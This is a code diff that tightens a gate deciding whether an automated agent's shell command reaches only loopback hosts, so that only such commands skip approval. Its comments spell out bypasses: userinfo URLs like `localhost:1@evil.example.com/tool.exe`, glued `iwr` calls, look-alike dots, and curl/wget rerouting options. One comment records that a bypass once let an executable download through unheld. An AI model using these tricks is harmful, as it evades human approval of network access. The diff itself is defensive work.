@@ -33,9 +33,11 @@
  * proves the server it started actually answers, and nothing comes back that the project did not
  * itself produce. Holding every health check for approval would turn an unattended run into one
  * that waits all night on its first test. The exception is narrow on purpose: every `http(s)://`
- * address in the command must be loopback, there must be at least one, and nothing else in the
- * command may look like a host — a bare `example.com` or `10.0.0.5` beside a localhost URL still
- * holds the step, because `iwr` accepts an address without a scheme.
+ * address in the command must be loopback, read the way the program will read it (the host after
+ * any `user@`, not the first word after `://`), there must be at least one, no option may send the
+ * request somewhere else, and nothing else in the command may look like a host — a bare
+ * `example.com` or `10.0.0.5` beside a localhost URL still holds the step, because `iwr` accepts an
+ * address without a scheme. Where the gate cannot read an address for certain, it is not local.
  *
  * The same text is screened whole, not command by command. That is deliberate and it is what
  * closes the obvious way round: writing `Invoke-WebRequest …` into a `.ps1` with `Set-Content` and
@@ -142,28 +144,93 @@ const FILE_EXTENSIONS = new Set([
 ]);
 
 /**
+ * The host a URL names, read from the text after its `://`, or null when it cannot be read for
+ * certain.
+ *
+ * Everything before the last `@` of an authority is userinfo, not the host: curl and
+ * Invoke-WebRequest both fetch `http://localhost:1@evil.example.com/tool.exe` from
+ * evil.example.com. Reading the host up to the first `:` called that "localhost", and the one
+ * download the hold exists for — an executable from somewhere else — went through unheld, in a
+ * check's command with nobody asked (found on 2026-10-01). So the authority is read whole, up to the
+ * first `/`, `?`, `#` or white space, and it is only this machine when it is nothing but a host and
+ * a port. An `@` anywhere in it, a `\`, a percent-encoded name, or a `$`, a backtick or a caret the
+ * shell would expand or escape at run time: the parsers disagree about each of those, or the gate
+ * cannot see what the shell will make of it, so none is read as loopback.
+ *
+ * Quotes are taken out before reading, because to the shell they are not the end of a word:
+ * `"http://localhost"@evil.example.com/` is one argument, and it is the URL with userinfo. After the
+ * host and port only an end of the argument may follow — `)`, `}`, `]`, `;`, `,`, `|`, `&`, `<`,
+ * `>` or nothing — and never another character of a name, so `localhost．evil.example.com`, whose
+ * full-width dot a URL parser turns into a plain one, is not "localhost" either.
+ */
+function urlHost(afterScheme: string): string | null {
+  const authority = (/^[^\/?#\s]*/.exec(afterScheme)?.[0] ?? '').replace(/["']/g, '');
+  if (/[@\\%$`^]/.test(authority)) return null;
+  return /^(\[[0-9a-f:.]+\]|[a-z0-9._~-]+)(?::\d*)?(?=$|[)}\];,|&<>])/i.exec(authority)?.[1] ?? null;
+}
+
+/**
+ * Whether one piece of a token reads as a host or an IP address that is not this machine. A name
+ * with a known file extension (`health.json`), or a .NET namespace (`System.Net`), is not a host.
+ */
+function namesAnotherHost(bare: string): boolean {
+  if (!bare) return false;
+  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(bare)) return !isLoopback(bare);
+  const labels = bare.split('.');
+  if (labels.length < 2 || labels.some((l) => l === '')) return false;
+  const last = labels[labels.length - 1]!.toLowerCase();
+  if (!/^[a-z]{2,}$/.test(last) || FILE_EXTENSIONS.has(last)) return false;
+  if (/^(system|microsoft|net)$/i.test(labels[0]!)) return false;
+  return !isLoopback(bare);
+}
+
+/**
+ * Options that send a request somewhere its URL does not say, or take more of them from a file the
+ * line does not show: curl's `--resolve` and `--connect-to` (the URL still says `localhost`, the
+ * connection goes to the address the option names), curl's `-K`/`--config`, and wget's
+ * `-i`/`--input-file` and `-e`/`--execute`. With any of them the URLs on the line are not the whole
+ * story, so the line is not provably local. The options are matched in their own case, as the
+ * programs read them: curl's `-k` (skip the certificate check) is an ordinary flag of a local health
+ * check and `-K` is not, and PowerShell's `-ErrorAction` after a `wget` alias is not wget's `-e`.
+ */
+const REDIRECTING_OPTIONS: RegExp[] = [
+  /(?:^|\s)(?:--(?:resolve|connect-to|config|input-file|execute)(?=[\s=]|$)|-K(?![a-zA-Z]))/,
+  /\bwget2?(?:\.exe)?\b[^|;\n]*\s-[ie]/,
+];
+
+/**
  * Whether every place this command could reach is this machine. True only when it names at least
- * one `http(s)://` address, all of them loopback, and no other token that reads as a host or an IP.
+ * one `scheme://` address, every one of them a loopback host read for certain (`urlHost`), no option
+ * sends the request elsewhere, and no other token reads as a host or an IP.
  */
 export function onlyLoopbackTargets(command: string): boolean {
-  const urls = [...command.matchAll(/\b[a-z][a-z0-9+.-]*:\/\/(\[[^\]]+\]|[^\/\s:'"`;|)]+)/gi)];
-  if (urls.length === 0) return false;
-  if (!urls.every((m) => isLoopback(m[1]!))) return false;
-  const rest = command.replace(/\b[a-z][a-z0-9+.-]*:\/\/\S+/gi, ' ');
-  for (const token of rest.split(/[\s'"`=,;|(){}]+/)) {
-    const bare = token.replace(/^-+/, '').replace(/[:\/].*$/, '');
-    if (!bare) continue;
-    if (/^\d{1,3}(\.\d{1,3}){3}$/.test(bare) && !isLoopback(bare)) return false;
-    const labels = bare.split('.');
-    if (labels.length < 2 || labels.some((l) => l === '')) continue;
-    const last = labels[labels.length - 1]!.toLowerCase();
-    if (!/^[a-z]{2,}$/.test(last)) continue;
-    if (FILE_EXTENSIONS.has(last)) continue;
-    // PowerShell member access on a variable or a type (`$r.StatusCode`, `System.Net`) is not a host.
+  const schemes = [...command.matchAll(/\b[a-z][a-z0-9+.-]*:\/\//gi)];
+  if (schemes.length === 0) return false;
+  for (const m of schemes) {
+    const host = urlHost(command.slice(m.index + m[0].length));
+    if (host === null || !isLoopback(host)) return false;
+  }
+  if (REDIRECTING_OPTIONS.some((option) => option.test(command))) return false;
+  /*
+   * The rest of the line, with each URL taken out up to where the shell ends it — white space, a
+   * quote, `;`, `|`, `&`, a bracket or a comma — so that a second command glued on after a path
+   * (`…/x;iwr('evil.example')`) is still read.
+   */
+  const rest = command.replace(/\b[a-z][a-z0-9+.-]*:\/\/[^\s'"`;|&(){}<>,]*/gi, ' ');
+  for (const token of rest.split(/[\s'"`=,;|&(){}<>]+/)) {
+    // A bracketed IPv6 address anywhere in the token: a proxy (`-x [2001:db8::1]:8080`) or an address given to curl.
+    for (const v6 of token.matchAll(/\[([0-9a-f:.]*:[0-9a-f:.]*)\]/gi)) if (!isLoopback(v6[1]!)) return false;
+    // PowerShell member access on a variable or a type (`$r.StatusCode`, `[System.Net.Dns]`) is not a host.
     if (token.startsWith('$') || token.startsWith('[')) continue;
-    if (/^(system|microsoft|net)$/i.test(labels[0]!)) continue;
-    if (isLoopback(bare)) continue;
-    return false;
+    /*
+     * Every piece between colons and `@`s, not only the first: `localhost:80:93.184.216.34` names an
+     * address after its second colon, `bob@evil.example` a host after its `@`, and either reroutes a
+     * request whose URL said localhost. Within a piece, only what comes before a `/` is a candidate,
+     * as in `example.com/x`; a Windows path's folders are not hosts.
+     */
+    for (const piece of token.replace(/^-+/, '').split(/[:@]+/)) {
+      if (namesAnotherHost(piece.replace(/\/.*$/, ''))) return false;
+    }
   }
   return true;
 }
